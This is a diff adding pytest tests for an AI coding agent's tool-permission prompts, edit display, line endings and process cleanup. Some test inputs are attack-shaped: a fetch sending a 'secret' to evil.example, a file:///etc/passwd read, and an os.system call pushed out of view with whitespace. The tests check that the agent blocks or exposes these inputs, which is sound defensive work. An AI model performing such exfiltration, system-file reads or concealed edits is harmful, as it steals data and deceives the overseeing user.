@@ -286,6 +286,70 @@ def test_a_request_that_failed_is_not_asked_twice(tmp_path, monkeypatch):
     assert len(a.messages) == n
 
 
+def test_always_for_one_address_is_not_for_one_without_a_scheme(tmp_path, monkeypatch):
+    went = []
+
+    async def dispatch(name, args, cfg):
+        went.append(args["url"])
+        return "page"
+
+    monkeypatch.setattr(code_agent.webtools, "dispatch", dispatch)
+    a, asked = _asking(tmp_path, monkeypatch, "a", "n", "a", "n")
+    assert a._exec_tool("web_fetch", {"url": "docs.example/3"}) == "page"
+    assert a._exec_tool("web_fetch", {"url": "evil.example/?d=secret"}) == "DENIED by user"
+    assert a._exec_tool("web_fetch", {"url": "HTTP://Docs.Example/4"}) == "page" and len(asked) == 2
+    # one with no host is asked about each time
+    assert a._exec_tool("web_fetch", {"url": "file:///etc/passwd"}) == "DENIED by user" and "always" not in asked[2]
+    assert went == ["http://docs.example/3", "HTTP://Docs.Example/4"]
+
+
+def test_what_is_not_shown_is_said_not_to_be(tmp_path, monkeypatch, capsys):
+    (tmp_path / "f").write_text("x = 0\n")
+    a, _ = _asking(tmp_path, monkeypatch, "n", "n")
+    a._exec_tool("edit_file", {"path": "f", "old_string": "x = 0", "new_string": "x = 1" + " " * 300 + "; os.system('evil')"})
+    assert "os.system('evil')" in capsys.readouterr().out
+    a._exec_tool("write_file", {"path": "g", "content": "ok\n" + "y" * 9000 + "evil"})
+    out = capsys.readouterr().out
+    assert "NOT SHOWN" in out and "+ok" in out
+
+
+def test_each_place_keeps_its_line_ending(tmp_path):
+    f = tmp_path / "f"
+    a = _agent(str(tmp_path))
+    f.write_bytes(b"one\r\ntwo\nthree\nfour\r\n")
+    assert "edited" in a._exec_tool("edit_file", {"path": "f", "old_string": "two\nthree", "new_string": "2\n3"})
+    assert "edited" in a._exec_tool("edit_file", {"path": "f", "old_string": "one", "new_string": "1\n1b"})
+    assert "edited" in a._exec_tool("edit_file", {"path": "f", "old_string": "four\n", "new_string": "4\n5\n"})
+    assert f.read_bytes() == b"1\r\n1b\r\n2\n3\n4\r\n5\r\n"
+    f.write_bytes(b"a.b\na.b\naxb\n")  # taken literally
+    assert "2 replacement" in a._exec_tool("edit_file", {"path": "f", "old_string": "a.b", "new_string": r"\1\g<0>", "replace_all": True})
+    assert f.read_bytes() == b"\\1\\g<0>\n\\1\\g<0>\naxb\n"
+
+
+@pytest.mark.skipif(sys.platform == "win32", reason="links")
+def test_a_link_to_itself_is_passed_over(tmp_path):
+    (tmp_path / "loop").symlink_to("loop")
+    (tmp_path / "f").write_text("hello")
+    a = _agent(str(tmp_path))
+    assert a._exec_tool("grep", {"pattern": "hello"}) == "f:1: hello" and "f" in a._exec_tool("list_files", {})
+
+
+@pytest.mark.skipif(sys.platform == "win32", reason="a shell's background")
+def test_what_a_command_left_in_the_background_ends_with_it(tmp_path):
+    import time
+
+    import psutil
+
+    a = _agent(str(tmp_path))
+    out = a._exec_tool("run_shell", {"command": "sleep 7777 & echo $! > pid; echo hi", "timeout": 1})
+    assert "timed out" in out
+    pid = int((tmp_path / "pid").read_text())
+    deadline = time.monotonic() + 5
+    while psutil.pid_exists(pid) and psutil.Process(pid).status() != psutil.STATUS_ZOMBIE and time.monotonic() < deadline:
+        time.sleep(0.1)
+    assert not psutil.pid_exists(pid) or psutil.Process(pid).status() == psutil.STATUS_ZOMBIE
+
+
 # ── getting there ─────────────────────────────────────────────────────────────
 
 @pytest.fixture
@@ -379,9 +443,40 @@ def test_without_a_model_it_says_where_to_choose_one(monkeypatch, capsys, tmp_pa
     cfg = config.load()
     up = []
     monkeypatch.setattr(background, "gateway_identity", lambda c: "hearth/9" if up else None)
-    monkeypatch.setattr(cli, "cmd_start", lambda a: up.append(a.background) or 0)
+    monkeypatch.setattr(cli, "cmd_start", lambda a: up.append(True) or 0)
     monkeypatch.setattr(cli.httpx, "get", lambda *a, **k: httpx.Response(200, json={"roles": {"embedding": {}}}))
     assert cli._engine_ready(cfg, "coding", None) is None
     assert up == [True] and "hearth setup" in capsys.readouterr().err
     assert cli._engine_ready(cfg, "coding", "some-model") == cli._admin_base(cfg)  # one was named
     assert cli._engine_ready(cfg, "embedding", None) and up == [True]  # started once
+
+
+def test_a_mode_that_cannot_be_gone_to_does_not_end_the_session(terminal, capsys):
+    """…and what was said so far stays."""
+    terminal("/system be brief", "/code", "n", "/system", "/exit")
+    assert cli.main(["chat"]) == 0
+    assert "system: be brief" in capsys.readouterr().out
+
+
+def test_each_mode_keeps_its_model_and_settings(terminal, monkeypatch, capsys):
+    asked = []
+    monkeypatch.setattr(cli, "_engine_ready", lambda cfg, role, model: asked.append((role, model)) or "http://127.0.0.1:1")
+    terminal("/model other", "/think off", "/code", "y", "/model coder", "/chat", "/status", "/code", "/exit")
+    assert cli.main(["chat", "--model", "big"]) == 0
+    assert asked == [("primary_chat", "big"), ("coding", None), ("primary_chat", "other"), ("coding", "coder")]
+    assert "model: other · deep-think: off" in capsys.readouterr().out
+
+
+def test_the_answer_is_all_there_is_on_stdout(monkeypatch, capsys, tmp_path):
+    import httpx
+
+    from hearth import background
+
+    monkeypatch.setenv("HEARTH_CONFIG", str(tmp_path / "config.yaml"))
+    monkeypatch.setattr(background, "gateway_identity", lambda c: None)
+    monkeypatch.setattr(background, "start", lambda *a: (True, "running (hearth/9)"))
+    monkeypatch.setattr(cli.httpx, "get", lambda *a, **k: httpx.Response(200, json={"roles": {"coding": {}}}))
+    monkeypatch.setattr(CodeAgent, "ask", lambda self, t: "the answer")
+    assert cli.main(["-q", "-p", "x"]) == 0
+    got = capsys.readouterr()
+    assert got.out == "the answer\n" and "running" in got.err
